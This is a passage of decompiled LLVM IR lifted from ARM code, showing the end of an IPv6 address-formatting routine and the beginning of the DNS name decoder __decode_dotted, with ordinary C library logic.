dec_label_pc_1877c:                               ; preds = %dec_label_pc_18754
  br i1 %v7_18768, label %dec_label_pc_187a0, label %dec_label_pc_18784

dec_label_pc_18784:                               ; preds = %dec_label_pc_1877c
  %v7_18784 = icmp eq i32 %v0_18784, -1
  %v0_18798.pre = load i32, i32* @r4, align 4
  %v1_1878c = load i32, i32* @r7, align 4
  %v7_18790 = icmp sgt i32 %v0_18798.pre, %v1_1878c
  %or.cond = or i1 %v7_18784, %v7_18790
  br i1 %or.cond, label %dec_label_pc_18794, label %dec_label_pc_1879c

dec_label_pc_18794:                               ; preds = %dec_label_pc_18784
  store i32 %v0_18794, i32* @r6, align 4
  store i32 %v0_18798.pre, i32* @r7, align 4
  br label %dec_label_pc_1879c

dec_label_pc_1879c:                               ; preds = %dec_label_pc_18784, %dec_label_pc_18794
  %v0_1878412 = phi i32 [ %v0_18794, %dec_label_pc_18794 ], [ %v0_18784, %dec_label_pc_18784 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_187a0

dec_label_pc_187a0:                               ; preds = %bb, %.thread, %dec_label_pc_1877c, %dec_label_pc_1879c
  %v0_187c8 = phi i32 [ %v0_18794, %.thread ], [ %v0_187a0, %bb ], [ %v0_18794, %dec_label_pc_1877c ], [ -1, %dec_label_pc_1879c ]
  %v0_187687 = phi i32 [ %v0_18768, %.thread ], [ %v0_187a0, %bb ], [ -1, %dec_label_pc_1877c ], [ -1, %dec_label_pc_1879c ]
  %v0_187b4 = phi i32 [ %v0_18784, %.thread ], [ %v0_18784, %bb ], [ %v0_18784, %dec_label_pc_1877c ], [ %v0_1878412, %dec_label_pc_1879c ]
  %v1_187a0 = add nuw nsw i32 %v0_187a0, 1
  %v7_187a8 = icmp slt i32 %v1_187a0, 8
  br i1 %v7_187a8, label %dec_label_pc_18754, label %dec_label_pc_187ac

dec_label_pc_187ac:                               ; preds = %dec_label_pc_187a0
  %v7_187ac = icmp eq i32 %v0_187c8, -1
  store i1 %v7_187ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_187ac, label %dec_label_pc_187ac.dec_label_pc_187cc_crit_edge, label %dec_label_pc_187b4

dec_label_pc_187ac.dec_label_pc_187cc_crit_edge:  ; preds = %dec_label_pc_187ac
  %v1_187f0.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_187cc

dec_label_pc_187b4:                               ; preds = %dec_label_pc_187ac
  %v7_187b4 = icmp eq i32 %v0_187b4, -1
  store i1 %v7_187b4, i1* %cpsr_z.global-to-local, align 1
  %v0_187c4.pre = load i32, i32* @r4, align 4
  br i1 %v7_187b4, label %dec_label_pc_187c4, label %dec_label_pc_187bc

dec_label_pc_187bc:                               ; preds = %dec_label_pc_187b4
  %v1_187bc = load i32, i32* @r7, align 4
  %v9_187bc = icmp eq i32 %v0_187c4.pre, %v1_187bc
  store i1 %v9_187bc, i1* %cpsr_z.global-to-local, align 1
  %v7_187c0 = icmp sgt i32 %v0_187c4.pre, %v1_187bc
  br i1 %v7_187c0, label %dec_label_pc_187c4, label %dec_label_pc_187cc

dec_label_pc_187c4:                               ; preds = %dec_label_pc_187b4, %dec_label_pc_187bc
  store i32 %v0_187c4.pre, i32* @r7, align 4
  store i32 %v0_187c8, i32* @r6, align 4
  br label %dec_label_pc_187cc

dec_label_pc_187cc:                               ; preds = %dec_label_pc_187ac.dec_label_pc_187cc_crit_edge, %dec_label_pc_187bc, %dec_label_pc_187c4
  %v1_187f0.pre = phi i32 [ %v1_187bc, %dec_label_pc_187bc ], [ %v1_187f0.pre.pre, %dec_label_pc_187ac.dec_label_pc_187cc_crit_edge ], [ %v0_187c4.pre, %dec_label_pc_187c4 ]
  %v0_187cc = phi i32 [ %v0_187b4, %dec_label_pc_187bc ], [ %v0_187b4, %dec_label_pc_187ac.dec_label_pc_187cc_crit_edge ], [ %v0_187c8, %dec_label_pc_187c4 ]
  %v7_187cc = icmp eq i32 %v0_187cc, -1
  store i1 %v7_187cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_187cc, label %dec_label_pc_187cc._crit_edge, label %dec_label_pc_187d4

dec_label_pc_187d4:                               ; preds = %dec_label_pc_187cc
  %v7_187d4 = icmp eq i32 %v1_187f0.pre, 1
  store i1 %v7_187d4, i1* %cpsr_z.global-to-local, align 1
  %v7_187d8 = icmp slt i32 %v1_187f0.pre, 2
  br i1 %v7_187d8, label %bb54, label %dec_label_pc_187cc._crit_edge

bb54:                                             ; preds = %dec_label_pc_187d4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_187cc._crit_edge

dec_label_pc_187cc._crit_edge:                    ; preds = %dec_label_pc_187cc, %dec_label_pc_187d4, %bb54
  %v0_187f0 = phi i32 [ %v0_187cc, %dec_label_pc_187d4 ], [ -1, %bb54 ], [ %v0_187cc, %dec_label_pc_187cc ]
  %v2_187e0 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_187e0, i32* @r4, align 4
  %v0_187e4 = load i32, i32* @r5, align 4
  %v2_187e4 = add i32 %v0_187e4, -32956
  store i32 %v2_187e4, i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_187f0 = add i32 %v0_187f0, %v1_187f0.pre
  store i32 %v2_187f0, i32* @sl, align 4
  %v9_18850 = icmp eq i32 %tmp, 65535
  %v7_187f868 = icmp eq i32 %v0_187f0, -1
  store i1 %v7_187f868, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_187f8

dec_label_pc_187f8:                               ; preds = %dec_label_pc_187cc._crit_edge, %dec_label_pc_188a8
  %v7_187f872 = phi i1 [ %v7_187f868, %dec_label_pc_187cc._crit_edge ], [ %v7_187f8, %dec_label_pc_188a8 ]
  %v0_1882471 = phi i32 [ 0, %dec_label_pc_187cc._crit_edge ], [ %v1_188a8, %dec_label_pc_188a8 ]
  %v1_1881070 = phi i32 [ %v0_187f0, %dec_label_pc_187cc._crit_edge ], [ %v0_187f8.pre, %dec_label_pc_188a8 ]
  %v2_1882869 = phi i32 [ %v2_187e0, %dec_label_pc_187cc._crit_edge ], [ %v3_1881429, %dec_label_pc_188a8 ]
  br i1 %v7_187f872, label %dec_label_pc_1881c, label %dec_label_pc_18800

dec_label_pc_18800:                               ; preds = %dec_label_pc_187f8
  %v9_18800 = icmp eq i32 %v0_1882471, %v1_1881070
  store i1 %v9_18800, i1* %cpsr_z.global-to-local, align 1
  %v5_18804 = icmp slt i32 %v0_1882471, %v1_1881070
  br i1 %v5_18804, label %dec_label_pc_1881c, label %dec_label_pc_18808

dec_label_pc_18808:                               ; preds = %dec_label_pc_18800
  %v1_18808 = load i32, i32* @sl, align 4
  %v9_18808 = icmp eq i32 %v0_1882471, %v1_18808
  store i1 %v9_18808, i1* %cpsr_z.global-to-local, align 1
  %v6_1880c = icmp slt i32 %v0_1882471, %v1_18808
  br i1 %v6_1880c, label %dec_label_pc_18810, label %dec_label_pc_1881c

dec_label_pc_18810:                               ; preds = %dec_label_pc_18808
  store i1 %v9_18800, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18800, label %bb56, label %dec_label_pc_188a8

bb56:                                             ; preds = %dec_label_pc_18810
  %v1_18814 = load i32, i32* @sb, align 4
  %v2_18814 = trunc i32 %v1_18814 to i8
  %v4_18814 = inttoptr i32 %v2_1882869 to i8*
  store i8 %v2_18814, i8* %v4_18814, align 1
  %v5_18814 = load i32, i32* @r4, align 4
  %v6_18814 = add i32 %v5_18814, 1
  store i32 %v6_18814, i32* @r4, align 4
  br label %dec_label_pc_188a8

dec_label_pc_1881c:                               ; preds = %dec_label_pc_18808, %dec_label_pc_18800, %dec_label_pc_187f8
  %v2_1881c = icmp eq i32 %v0_1882471, 0
  store i1 %v2_1881c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1881c, label %dec_label_pc_1888c, label %dec_label_pc_18824

dec_label_pc_18824:                               ; preds = %dec_label_pc_1881c
  %v7_18824 = icmp eq i32 %v0_1882471, 6
  store i1 %v7_18824, i1* %cpsr_z.global-to-local, align 1
  %v0_18828 = load i32, i32* @sb, align 4
  %v1_18828 = trunc i32 %v0_18828 to i8
  %v3_18828 = inttoptr i32 %v2_1882869 to i8*
  store i8 %v1_18828, i8* %v3_18828, align 1
  %v4_18828 = load i32, i32* @r4, align 4
  %v5_18828 = add i32 %v4_18828, 1
  store i32 %v5_18828, i32* @r4, align 4
  %v0_1882c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1882c, label %dec_label_pc_18830, label %dec_label_pc_1888c

dec_label_pc_18830:                               ; preds = %dec_label_pc_18824
  %v0_18830 = load i32, i32* @r6, align 4
  %v2_18830 = icmp eq i32 %v0_18830, 0
  store i1 %v2_18830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18830, label %dec_label_pc_18838, label %dec_label_pc_1888c

dec_label_pc_18838:                               ; preds = %dec_label_pc_18830
  %v0_18838 = load i32, i32* @r7, align 4
  %v7_18838 = icmp eq i32 %v0_18838, 6
  store i1 %v7_18838, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18838, label %dec_label_pc_18858, label %dec_label_pc_18840

dec_label_pc_18840:                               ; preds = %dec_label_pc_18838
  %v7_18840 = icmp eq i32 %v0_18838, 5
  store i1 %v7_18840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18840, label %dec_label_pc_18848, label %dec_label_pc_1888c

dec_label_pc_18848:                               ; preds = %dec_label_pc_18840
  store i1 %v9_18850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18850, label %dec_label_pc_18858, label %dec_label_pc_1888c

dec_label_pc_18858:                               ; preds = %dec_label_pc_18848, %dec_label_pc_18838
  %v2_1885c = sub i32 %v2_18728, %v5_18828
  %v1_18860 = add i32 %v2_1885c, -32
  store i32 %v1_18860, i32* %r2.global-to-local, align 4
  %v0_18864 = load i32, i32* @r8, align 4
  %v1_18864 = add i32 %v0_18864, 12
  store i32 %v1_18864, i32* %r0.global-to-local, align 4
  %v3_1886c = call i32 @inet_ntop4(i32 %v1_18864, i32 %v5_18828, i32 %v1_18860)
  store i32 %v3_1886c, i32* %r0.global-to-local, align 4
  %v2_18870 = icmp eq i32 %v3_1886c, 0
  store i1 %v2_18870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18870, label %bb57, label %dec_label_pc_1887c

bb57:                                             ; preds = %dec_label_pc_18858
  %v1_18874 = load i32, i32* @r6, align 4
  store i32 %v1_18874, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1891c

dec_label_pc_1887c:                               ; preds = %dec_label_pc_18858
  %v0_1887c = load i32, i32* @r4, align 4
  %v1_1887c = inttoptr i32 %v0_1887c to i8*
  store i32 %v0_1887c, i32* %r0.global-to-local, align 4
  %v3_18880 = call i32 @strlen(i8* %v1_1887c)
  store i32 %v3_18880, i32* %r0.global-to-local, align 4
  %v0_18884 = load i32, i32* @r4, align 4
  %v2_18884 = add i32 %v0_18884, %v3_18880
  store i32 %v2_18884, i32* @r4, align 4
  %v0_188bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_188bc

dec_label_pc_1888c:                               ; preds = %dec_label_pc_18848, %dec_label_pc_18840, %dec_label_pc_18830, %dec_label_pc_18824, %dec_label_pc_1881c
  %v0_18894 = phi i32 [ %v5_18828, %dec_label_pc_18848 ], [ %v5_18828, %dec_label_pc_18840 ], [ %v5_18828, %dec_label_pc_18830 ], [ %v5_18828, %dec_label_pc_18824 ], [ %v2_1882869, %dec_label_pc_1881c ]
  store i32 %v2_18728, i32* @lr, align 4
  %v1_18890 = load i32, i32* @r5, align 4
  %v4_18890 = mul i32 %v1_18890, 4
  %v5_18890 = add i32 %v4_18890, %v2_18728
  store i32 %v0_18894, i32* @r0, align 4
  %v1_18898 = add i32 %v5_18890, -32
  %v2_18898 = inttoptr i32 %v1_18898 to i32*
  %v3_18898 = load i32, i32* %v2_18898, align 4
  store i32 %v3_18898, i32* %r2.global-to-local, align 4
  %v0_1889c = load i32, i32* @fp, align 4
  %v7_188a0 = call i32 @sprintf(i32 %v0_18894, i32 %v0_1889c, i32 %v3_18898, i32 %v5_18890, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_188a0, i32* %r0.global-to-local, align 4
  %v0_188a4 = load i32, i32* @r4, align 4
  %v2_188a4 = add i32 %v0_188a4, %v7_188a0
  store i32 %v2_188a4, i32* @r4, align 4
  br label %dec_label_pc_188a8

dec_label_pc_188a8:                               ; preds = %bb56, %dec_label_pc_18810, %dec_label_pc_1888c
  %v3_1881429 = phi i32 [ %v6_18814, %bb56 ], [ %v2_1882869, %dec_label_pc_18810 ], [ %v2_188a4, %dec_label_pc_1888c ]
  %v0_188a8 = load i32, i32* @r5, align 4
  %v1_188a8 = add i32 %v0_188a8, 1
  store i32 %v1_188a8, i32* @r5, align 4
  %v0_187f8.pre = load i32, i32* @r6, align 4
  %v7_188b0 = icmp slt i32 %v1_188a8, 8
  %v7_187f8 = icmp eq i32 %v0_187f8.pre, -1
  store i1 %v7_187f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_188b0, label %dec_label_pc_187f8, label %dec_label_pc_188b4

dec_label_pc_188b4:                               ; preds = %dec_label_pc_188a8
  br i1 %v7_187f8, label %.thread2, label %dec_label_pc_188bc

dec_label_pc_188bc:                               ; preds = %dec_label_pc_188b4, %dec_label_pc_1887c
  %v3_188c8 = phi i32 [ %v3_1881429, %dec_label_pc_188b4 ], [ %v2_18884, %dec_label_pc_1887c ]
  %v0_188bc = phi i32 [ %v0_187f8.pre, %dec_label_pc_188b4 ], [ %v0_188bc.pre, %dec_label_pc_1887c ]
  %v1_188bc = load i32, i32* @r7, align 4
  %v2_188bc = add i32 %v1_188bc, %v0_188bc
  %v7_188c0 = icmp eq i32 %v2_188bc, 8
  store i1 %v7_188c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_188c0, label %bb58, label %.thread2

bb58:                                             ; preds = %dec_label_pc_188bc
  %v4_188c8 = inttoptr i32 %v3_188c8 to i8*
  store i8 58, i8* %v4_188c8, align 1
  %v5_188c8 = load i32, i32* @r4, align 4
  %v6_188c8 = add i32 %v5_188c8, 1
  store i32 %v6_188c8, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_188bc, %dec_label_pc_188b4, %bb58
  %v2_188d0 = phi i32 [ %v3_188c8, %dec_label_pc_188bc ], [ %v3_1881429, %dec_label_pc_188b4 ], [ %v6_188c8, %bb58 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_188d0 = inttoptr i32 %v2_188d0 to i8*
  store i8 0, i8* %v3_188d0, align 1
  %v4_188d0 = load i32, i32* @r4, align 4
  %v5_188d0 = add i32 %v4_188d0, 1
  store i32 %v2_187e0, i32* @r1, align 4
  %v2_188d8 = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_188d8, i32* %r2.global-to-local, align 4
  %v2_188dc = sub i32 %v5_188d0, %v2_187e0
  %v9_188e0 = icmp eq i32 %v2_188dc, %v2_188d8
  store i1 %v9_188e0, i1* %cpsr_z.global-to-local, align 1
  %tmp75 = icmp ugt i32 %v2_188dc, %v2_188d8
  br i1 %tmp75, label %dec_label_pc_188e8, label %dec_label_pc_188fc

dec_label_pc_188e8:                               ; preds = %.thread2
  %v0_188e8 = call i32 @__GI___errno_location()
  store i32 %v0_188e8, i32* %r0.global-to-local, align 4
  %v0_188f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_188f0, i32* %r2.global-to-local, align 4
  %v2_188f4 = inttoptr i32 %v0_188e8 to i32*
  store i32 28, i32* %v2_188f4, align 4
  %v0_1891c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1891c

dec_label_pc_188fc:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_18900 = inttoptr i32 %arg3 to i8*
  %v3_18900 = call i32 @strcpy(i8* %v2_18900, i32 %v2_187e0)
  br label %dec_label_pc_18904

dec_label_pc_18904:                               ; preds = %dec_label_pc_186e4, %dec_label_pc_188fc
  %storemerge = phi i32 [ %v3_186f0, %dec_label_pc_186e4 ], [ %v3_18900, %dec_label_pc_188fc ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1891c

dec_label_pc_1890c:                               ; preds = %dec_label_pc_186d8
  %v0_1890c = call i32 @__GI___errno_location()
  store i32 %v0_1890c, i32* %r0.global-to-local, align 4
  %v2_18914 = inttoptr i32 %v0_1890c to i32*
  store i32 97, i32* %v2_18914, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1891c

dec_label_pc_1891c:                               ; preds = %bb57, %dec_label_pc_18904, %dec_label_pc_188e8, %dec_label_pc_1890c
  %v0_1891c = phi i32 [ %v1_18874, %bb57 ], [ %storemerge, %dec_label_pc_18904 ], [ %v0_1891c.pre, %dec_label_pc_188e8 ], [ 0, %dec_label_pc_1890c ]
  store i32 %v0_1891c, i32* %r0.global-to-local, align 4
  store i32 %v6_186b4, i32* %r5.global-to-local, align 4
  ret i32 %v0_1891c

; uselistorder directives
  uselistorder i32 %v0_1891c, { 1, 0 }
  uselistorder i1 %v7_187f8, { 2, 0, 1 }
  uselistorder i32 %v0_187f8.pre, { 1, 0, 2 }
  uselistorder i32 %v1_188a8, { 0, 2, 1 }
  uselistorder i32 %v0_18894, { 1, 0 }
  uselistorder i32 %v0_1887c, { 1, 0 }
  uselistorder i32 %v5_18828, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i1 %v9_18800, { 1, 0, 2 }
  uselistorder i32 %v2_1882869, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1882471, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_187f868, { 1, 0 }
  uselistorder i32 %v2_187e0, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_187f0, { 1, 0, 2 }
  uselistorder i1 %v7_187cc, { 1, 0 }
  uselistorder i32 %v0_187cc, { 1, 2, 0 }
  uselistorder i32 %v1_187f0.pre, { 2, 0, 1 }
  uselistorder i32 %v0_187c4.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_187b4, { 1, 0 }
  uselistorder i1 %v7_187ac, { 1, 0 }
  uselistorder i32 %v1_187a0, { 1, 0 }
  uselistorder i32 %v0_187b4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_187c8, { 1, 2, 0, 3 }
  uselistorder i1 %v7_18768, { 1, 0 }
  uselistorder i32 %v0_187a0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_18784, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_18794, { 3, 1, 0, 2 }
  uselistorder i32 %v1_18724, { 1, 0, 2 }
  uselistorder i32 %v2_1870c, { 1, 0 }
  uselistorder i32 %v0_18724, { 3, 1, 0, 2 }
  uselistorder i32 %v2_18728, { 0, 4, 3, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 16, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 14, 13, 15, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 23, 14, 15, 16, 17, 18, 22, 19, 20, 21 }
  uselistorder i32 97, { 5, 6, 9, 1, 0, 8, 2, 3, 4, 7 }
  uselistorder i8 58, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1891c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_18904, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_188a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_187f8, { 1, 0 }
  uselistorder label %dec_label_pc_187cc._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_187cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_187c4, { 1, 0 }
  uselistorder label %dec_label_pc_187a0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1879c, { 1, 0 }
  uselistorder label %dec_label_pc_18754, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_18938 = load i32, i32* @r5, align 4
  %v0_1893c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1893c, i32* %sl.global-to-local, align 4
  %v2_1893c = icmp eq i32 %v0_1893c, 0
  br i1 %v2_1893c, label %.thread30, label %dec_label_pc_18964.preheader

.thread30:                                        ; preds = %entry
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18a24

dec_label_pc_18964.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_189644 = load i32, i32* @r1, align 4
  %v6_1896814 = icmp slt i32 %v0_189644, %arg2
  br i1 %v6_1896814, label %dec_label_pc_1896c.preheader, label %dec_label_pc_18a24

dec_label_pc_1896c.preheader:                     ; preds = %dec_label_pc_18964.preheader
  %v2_1896c51 = add i32 %v0_1893c, %v0_189644
  %v3_1896c52 = inttoptr i32 %v2_1896c51 to i8*
  %v4_1896c53 = load i8, i8* %v3_1896c52, align 1
  %v6_1896c54 = zext i8 %v4_1896c53 to i32
  store i32 %v6_1896c54, i32* @r4, align 4
  %v2_1897055 = icmp eq i8 %v4_1896c53, 0
  br i1 %v2_1897055, label %bb49, label %dec_label_pc_18978

dec_label_pc_18960:                               ; preds = %bb48, %bb44
  %v1_18964 = phi i32 [ %v1_18964.pre, %bb48 ], [ %v1_1899059, %bb44 ]
  %v0_18964 = phi i32 [ %v0_18964.pre, %bb48 ], [ %v5_189a8, %bb44 ]
  %v0_18960 = phi i32 [ %v0_18960.pre, %bb48 ], [ %v0_189ac60, %bb44 ]
  store i32 %v0_18960, i32* %r0.global-to-local, align 4
  %v6_18968 = icmp slt i32 %v0_18964, %v1_18964
  br i1 %v6_18968, label %dec_label_pc_18960.dec_label_pc_1896c_crit_edge, label %dec_label_pc_18a24

dec_label_pc_18960.dec_label_pc_1896c_crit_edge:  ; preds = %dec_label_pc_18960
  %v0_1896c.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_1896c = add i32 %v0_1896c.pre, %v0_18964
  %v3_1896c = inttoptr i32 %v2_1896c to i8*
  %v4_1896c = load i8, i8* %v3_1896c, align 1
  %v6_1896c = zext i8 %v4_1896c to i32
  store i32 %v6_1896c, i32* @r4, align 4
  %v2_18970 = icmp eq i8 %v4_1896c, 0
  %v0_18a10 = load i32, i32* @ip, align 4
  %v2_18a10 = icmp eq i32 %v0_18a10, 0
  br i1 %v2_18970, label %dec_label_pc_18a10, label %dec_label_pc_18978

dec_label_pc_18978:                               ; preds = %dec_label_pc_1896c.preheader, %dec_label_pc_18960.dec_label_pc_1896c_crit_edge
  %v2_18a1066 = phi i1 [ %v2_18a10, %dec_label_pc_18960.dec_label_pc_1896c_crit_edge ], [ false, %dec_label_pc_1896c.preheader ]
  %v0_18a1064 = phi i32 [ %v0_18a10, %dec_label_pc_18960.dec_label_pc_1896c_crit_edge ], [ 1, %dec_label_pc_1896c.preheader ]
  %v6_1896c63 = phi i32 [ %v6_1896c, %dec_label_pc_18960.dec_label_pc_1896c_crit_edge ], [ %v6_1896c54, %dec_label_pc_1896c.preheader ]
  %v0_1899862 = phi i32 [ %v0_1896c.pre, %dec_label_pc_18960.dec_label_pc_1896c_crit_edge ], [ %v0_1893c, %dec_label_pc_1896c.preheader ]
  %v0_1898861 = phi i32 [ %v0_18964, %dec_label_pc_18960.dec_label_pc_1896c_crit_edge ], [ %v0_189644, %dec_label_pc_1896c.preheader ]
  %v0_189ac60 = phi i32 [ %v0_18960, %dec_label_pc_18960.dec_label_pc_1896c_crit_edge ], [ 0, %dec_label_pc_1896c.preheader ]
  %v1_1899059 = phi i32 [ %v1_18964, %dec_label_pc_18960.dec_label_pc_1896c_crit_edge ], [ %arg2, %dec_label_pc_1896c.preheader ]
  %v1_1897c = and i32 %v6_1896c63, 192
  br i1 %v2_18a1066, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_18978
  %v1_18980 = load i32, i32* %r8.global-to-local, align 4
  %v2_18980 = add i32 %v1_18980, 1
  store i32 %v2_18980, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_18978, %bb
  %v2_18984 = icmp eq i32 %v1_1897c, 192
  %v1_18988 = add i32 %v0_1898861, 1
  store i32 %v1_18988, i32* %r1.global-to-local, align 4
  br i1 %v2_18984, label %dec_label_pc_18990, label %dec_label_pc_189b8

dec_label_pc_18990:                               ; preds = %bb42
  %v6_18994 = icmp slt i32 %v1_18988, %v1_1899059
  br i1 %v6_18994, label %dec_label_pc_18998, label %dec_label_pc_18a24

dec_label_pc_18998:                               ; preds = %dec_label_pc_18990
  %v2_18998 = add i32 %v1_18988, %v0_1899862
  %v3_18998 = inttoptr i32 %v2_18998 to i8*
  %v4_18998 = load i8, i8* %v3_18998, align 1
  %v6_18998 = zext i8 %v4_18998 to i32
  %v1_189a0 = urem i32 %v6_1896c63, 64
  br i1 %v2_18a1066, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_18998
  %v1_189a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_189a4 = add i32 %v1_189a4, 1
  store i32 %v2_189a4, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_18998, %bb43
  %v4_189a8 = mul nuw nsw i32 %v1_189a0, 256
  %v5_189a8 = or i32 %v6_18998, %v4_189a8
  store i32 %v5_189a8, i32* %r1.global-to-local, align 4
  store i32 %v0_189ac60, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_18960

dec_label_pc_189b8:                               ; preds = %bb42
  %v2_189b8 = add i32 %v6_1896c63, %v0_189ac60
  store i32 %v2_189b8, i32* %r6.global-to-local, align 4
  %v3_189bc = load i32, i32* %stack_var_0, align 4
  store i32 %v3_189bc, i32* @r3, align 4
  %v1_189c0 = add i32 %v2_189b8, 1
  store i32 %v1_189c0, i32* %r7.global-to-local, align 4
  %v3_189c4 = icmp ult i32 %v1_189c0, %v3_189bc
  br i1 %v3_189c4, label %dec_label_pc_189cc, label %dec_label_pc_18a24

dec_label_pc_189cc:                               ; preds = %dec_label_pc_189b8
  %v2_189cc = add i32 %v6_1896c63, %v1_18988
  store i32 %v2_189cc, i32* @r5, align 4
  %v3_189d0 = icmp ult i32 %v2_189cc, %v1_1899059
  br i1 %v3_189d0, label %dec_label_pc_189d8, label %dec_label_pc_18a24

dec_label_pc_189d8:                               ; preds = %dec_label_pc_189cc
  %v2_189d8 = add i32 %v1_18988, %v0_1899862
  store i32 %v2_189d8, i32* @r1, align 4
  %v0_189dc = load i32, i32* %sb.global-to-local, align 4
  %v2_189dc = add i32 %v0_189dc, %v0_189ac60
  store i32 %v2_189dc, i32* @r0, align 4
  store i32 %v6_1896c63, i32* @r2, align 4
  %v0_189e8 = call i32 @memcpy()
  store i32 %v0_189e8, i32* %r0.global-to-local, align 4
  store i32 %v0_18a1064, i32* @ip, align 4
  %v0_189f0 = load i32, i32* %sl.global-to-local, align 4
  %v1_189f0 = load i32, i32* @r5, align 4
  %v2_189f0 = add i32 %v1_189f0, %v0_189f0
  %v3_189f0 = inttoptr i32 %v2_189f0 to i8*
  %v4_189f0 = load i8, i8* %v3_189f0, align 1
  br i1 %v2_18a1066, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_189d8
  %v1_189f8 = load i32, i32* %r8.global-to-local, align 4
  %v2_189f8 = load i32, i32* @r4, align 4
  %v3_189f8 = add i32 %v2_189f8, %v1_189f8
  store i32 %v3_189f8, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_189d8, %bb45
  %v2_189fc = icmp eq i8 %v4_189f0, 0
  br i1 %v2_189fc, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_18a08.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_189f0, i32* %r1.global-to-local, align 4
  %v2_18a08 = load i32, i32* %sb.global-to-local, align 4
  %v3_18a08 = load i32, i32* %r6.global-to-local, align 4
  %v4_18a08 = add i32 %v3_18a08, %v2_18a08
  %v5_18a08 = inttoptr i32 %v4_18a08 to i8*
